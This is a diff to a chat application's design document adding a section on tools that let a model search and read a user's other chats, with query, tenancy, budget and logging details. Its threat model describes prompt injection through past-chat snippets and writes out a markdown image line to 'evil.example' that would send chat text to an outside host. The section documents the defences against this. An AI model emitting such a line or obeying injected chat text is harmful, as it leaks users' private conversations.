@@ -296,6 +296,209 @@ with a small pin badge shown in place. This is a deliberate product decision
 for a throwaway quick-switcher preview (as opposed to a persistent sidebar
 list, where pin-to-top is a more established convention) — not a bug to fix.
 
+## Model-facing tools: `search_chats` and `read_chat`
+
+Workstream W2 of `docs/memory-architecture.md` (section 3.3) lets the model
+search and read the user's **other** chats, so "what do you know about me" and
+"what did we decide in that other chat" work across chats. It reuses the
+`message_search` table above: no schema change, no new index.
+
+Code lives in `server/utils/memory/tools/`:
+
+| File | Role |
+|---|---|
+| `constants.ts` | Every cap, the tool names, the `<chat_excerpt>` tags and the untrusted-data notice |
+| `enabled.ts` | `isChatSearchToolEnabled()`, the single gate (returns `true` today) |
+| `chat-search-budget.ts` | Per-request call budget, shared by both tools |
+| `search-chats.ts` | The FTS query, AND to OR fallback, best hit per chat |
+| `read-chat.ts` | Ownership-checked, bounded read window |
+| `excerpt.ts` | Neutralising and wrapping of every string that reaches the model |
+| `index.ts` | `getChatSearchTools()`, the AI SDK tool definitions |
+
+### Contracts
+
+`search_chats({ query, limit? })` returns
+`{ notice, results: [{ chatId, title, url, messageId, role, date, snippet }] }`:
+at most 8 chats (default 5), the best-ranked message per chat, current chat
+excluded. `chatId` is the chat `slug` (ULID), `url` is `/chats/<slug>`,
+`messageId` is the message `publicId` (never the integer rowid). The output
+field is deliberately named `results` and carries no `provider` field: the
+continuation flattener and the chip render `results[]`, while
+`emitSourcesForExternalSearchResults` mirrors outputs into web-source
+citations **only** when `provider` is `brave`, `exa` or `deepseek`.
+
+`read_chat({ chatId, aroundMessageId? })` returns
+`{ notice, chat, messages, truncated, nextAroundMessageId? }`: text parts only
+(tool, reasoning, file and persisted failure-notice parts are skipped),
+whitespace preserved so code blocks survive, at most `READ_CHAT_MAX_CHARS`
+(8000, about 3k Cyrillic tokens; Ukrainian costs roughly 2 to 3 characters
+per token) in total and `READ_CHAT_MESSAGE_MAX_CHARS` (3000) per message,
+centred on `aroundMessageId` or starting at the chat start. When more of the
+chat follows, `nextAroundMessageId` is `from:<publicId>` of the first message
+after the window; passing it back as `aroundMessageId` starts the next window
+at that message and grows only forward, so consecutive calls never repeat a
+message. (A cursor that merely pointed at the last returned message stalled
+on long messages: the window grew backwards first and returned the same
+text.) The `from:` prefix is the stateless way to tell a continuation from a
+search-hit `messageId`; real ids contain no colon. Legacy rows without a
+`public_id` are skipped when picking the cursor.
+
+### Query fallback
+
+LLM-written queries are sentences, so the strict prefix-AND of the history
+search often finds nothing. `search_chats` runs the AND expression first and,
+only when that returns no row, the same tokens as an OR expression, ranked by
+the same `bm25(message_search, 0.0, 1.0, 0.4)`. **The OR expression must be
+`{owner}: uN AND (c1 OR c2 ...)`.** FTS5 binds `AND` tighter than `OR`, so
+without the parentheses `{owner}: u1 AND a OR b` parses as
+`(owner AND a) OR b` and returns other tenants' rows; this was reproduced
+against a real FTS5 table and is pinned by tests. In OR mode tokens shorter
+than two characters are dropped (one-character prefixes match the whole
+index); two-character tokens such as `AI`, `DB`, `R2` stay.
+
+The doc's "drop the rarest-missing tokens" middle step is **not** implemented:
+AND to OR only. OR with bm25 already ranks documents that match more tokens
+first, and the middle step needs per-token document frequencies that FTS5
+does not expose cheaply.
+
+All LLM text goes through the same normalise, tokenise and escape path as
+user text (`buildSearchMatchExpression`). The tokenizer splits on everything
+except letters, digits and U+02BC, so `"`, `\`, parentheses, `*`, `^`, `:`
+and braces can never reach the MATCH string, and `AND`/`OR`/`NOT`/`NEAR`
+become lowercase quoted prefix phrases. The tenancy check is the same triple
+described above (owner in MATCH, bound `ms.owner = ?`, bound `c.user_id = ?`).
+
+### Scope: current chat and projects
+
+The current chat is excluded inside the query (`m.chat_id != ?`). An optional
+`projectId` restricts to `c.project_id = ?`, **inside the same FTS query,
+before the 200-candidate `LIMIT`**. A post-filter would give a small project
+zero hits whenever other chats fill the candidate list; the unit test creates
+more than 200 stronger matches outside the project to prove it. Both tools
+accept `projectId`, and `read_chat` answers 404 for a chat outside it.
+Project isolation is not a setting yet, so the route passes no `projectId`
+and the production scope is all of the user's chats (also from inside a
+project chat). There is no incognito flag in the schema either, so nothing
+filters incognito chats yet. Both belong to the settings workstream.
+
+### Registration, budget and the tool loop
+
+The tools are registered server-side in `chats/[slug]/index.post.ts` after
+the Brave/Exa block, never added to the client `chatToolSchema` enum (so they
+do not inherit "web search and image generation cannot combine"). A send gets
+them only when **all** hold:
+
+- `isChatSearchToolEnabled()`;
+- no forced `toolChoice` on `parsedTools`: image generation and Google
+  native `web_search` force one, and a forced choice plus the follow-up
+  marker would re-select the same tool forever (see the `withFollowUpTurn`
+  JSDoc). This is a deliberate deviation from "coexist with everything":
+  those two sends never get chat search;
+- the send is not an image generation send (gateway image generation sets no
+  `toolChoice`);
+- the model supports tool calling: `Model.toolCall === true` for direct
+  providers, `gatewayToolCall === true` (strict, fail-closed) for gateways.
+
+**Budget.** `createChatSearchBudget()` allows 3 calls per request, shared by
+`search_chats` and `read_chat`, consumed synchronously at the top of each
+`execute` (parallel calls in one step cannot exceed it). A spent budget throws
+a 429 `createError`, which the SDK turns into a `tool-error` part, not a
+stream failure, exactly like `search-budget.ts` for Brave/Exa. The two
+budgets are independent: chat calls are never counted as billable web
+searches (that accounting is name-based).
+
+**Loop cap.** Both tools carry `withFollowUpTurn()`, so a send that registers
+them runs the multi-step loop. `resolveToolLoop(tools, { chatSearchSteps })`
+computes the cap as `toolSteps + 1`, where `toolSteps` is
+`TOOL_LOOP_MAX_TOOL_STEPS` (3) if any non-chat follow-up tool is registered,
+plus 3 if chat tools are registered. Web only is 4 (unchanged), web plus chat
+is 7, chat only is 4. The forced answer step is `cap - 1`, and the route reads
+the same value for `forcedStepIndex`, so the forced answer step and the
+search-answer continuation guarantee keep working with the raised cap. A
+consequence worth knowing: **every send on a tool-calling model is now a loop
+send** (`stopWhen`, `prepareStep`, and the 540 s total timeout from
+`TOOL_LOOP_TOTAL_TIMEOUT_MS`), even with no tool requested, and
+Cloudflare-gateway plus Brave sends can run up to 7 steps. The two existing
+integration specs whose mocked model has `toolCall: true`
+(`chats-gateway`, `chats-cloudflare-search-answer`) mock the gate off to keep
+their original assertions; `chats-chat-search-tools.spec.ts` covers the
+registered path.
+
+**Instruction.** One constant line (`CHAT_SEARCH_INSTRUCTION`) sits right
+after the project system prompt in `buildChatInstructions`, before anything
+that carries the daily date, so it stays in the stable cached prefix
+(`docs/providers/anthropic.md` lists the invalidators). It is emitted only
+when the tools were registered and is omitted from the tool-less
+continuation. Adding the tools to a model that had none changes its tool set
+once, which invalidates the Anthropic cache one time.
+
+### Logging
+
+The Axiom dataset is at its 256-field cap (`docs/axiom-map-fields.md`), so
+the tools log only under `attributes.chatSearch.*`: `operator` and `hits` for
+a search, `messages` and `truncated` for a read, `error` on a failed query,
+and `registered` plus `usedCalls` on the `ai-stream` event. No query text or
+chat content is ever logged.
+
+### UI and persistence
+
+The tool parts render as a compact search-step chip ("Searched your chats",
+"Read a chat") with in-app links; only `/chats/<alphanumeric slug>` paths
+become links, everything else is dropped. The parts persist in
+`messages.parts` like Brave/Exa parts (no `messages.tools` change: that
+column holds the client-requested tools). `sanitizeMessagesForModelContext`
+is a whitelist, so past `tool-search_chats`/`tool-read_chat` parts never reach
+a later model context (pinned by a test). Public shares and branches strip
+tool parts as well.
+
+### Threat model
+
+- **Cross-user leakage.** Every query is bound to the session's user three
+  ways (above); `read_chat` looks the chat up by `slug` **and** `userId`, a
+  missing chat, another user's chat and another project's chat produce the
+  identical 404 (no existence oracle), and `aroundMessageId` only resolves
+  inside the verified chat. Model-supplied ids are never hashid-decoded.
+- **FTS MATCH injection.** None found; verified by running about 28 hostile
+  inputs against a real FTS5 table in both operators.
+- **Prompt injection through snippets.** Everything the model gets back is
+  quoted history: every `<`/`>` (ASCII and look-alike brackets) is replaced,
+  strings are wrapped in `<chat_excerpt>`, the output carries a `notice`, the
+  tool descriptions say the content is data and never instructions, and the
+  continuation keeps results inside `<untrusted_web_search_results>`. The
+  delimiter is a fixed tag, not a per-request nonce: a past chat can contain
+  text that merely looks like a boundary, so treat this as a mitigation, not
+  a guarantee. A chat the user branched from a shared chat contains
+  third-party-authored text indexed as the user's own. The tool-less
+  continuation renders chat results under their own `Chat search N` /
+  `Chat read N` headings with the notice and the full `read_chat` window,
+  inside the same untrusted tag.
+- **Exfiltration through rendered markdown.** This is the real risk of
+  giving the model the whole history. Before W2 a poisoned turn could leak
+  only the current chat; now it can pull other chats into context and emit
+  `![](https://evil.example/?d=<text>)`, which the browser would fetch the
+  moment it renders (and again on every reopen). The fix is at the render
+  layer: `app/components/prose/Img.vue` is registered as `img` for chat
+  messages, shared chats, reasoning text and project memory. It renders only
+  same-origin images (and raster `data:image/*`); every other `src` becomes a
+  blocked-image placeholder that shows the hostname only, never the URL, and
+  opens the link through the existing external-link confirmation. It ignores
+  `allowExternalLinks` on purpose. A same-origin GET to a route with side
+  effects would still fire, so GET routes must stay side-effect free. The
+  other leak channel (the model putting excerpts into a Brave/Exa query) is
+  bounded by the 3-call budgets and uses the user's own search key.
+- **Data crossing providers.** The tools send up to about 8k characters of an
+  old chat to whichever provider or gateway the *current* chat uses. They are
+  on for everyone until `isChatSearchToolEnabled()` is wired to a user
+  setting; that wiring is the opt-in `docs/memory-architecture.md` describes.
+- **Persisted copies.** Tool outputs, including excerpts of other chats, are
+  stored in the current chat's `messages.parts`. Deleting chat A does not
+  erase excerpts of it that were stored while chatting in chat B. This is a
+  retention point for the data-rights workstream (W8).
+- **Cost.** Each call is two indexed queries at most (AND, then OR) with a
+  200-row candidate cap, bounded output, and no D1 write. The tool
+  definitions add roughly 400 tokens to every request on a tool-calling
+  model.
+
 ## Operational Risks
 
 **`wrangler d1 export` is incompatible with a database containing an FTS5
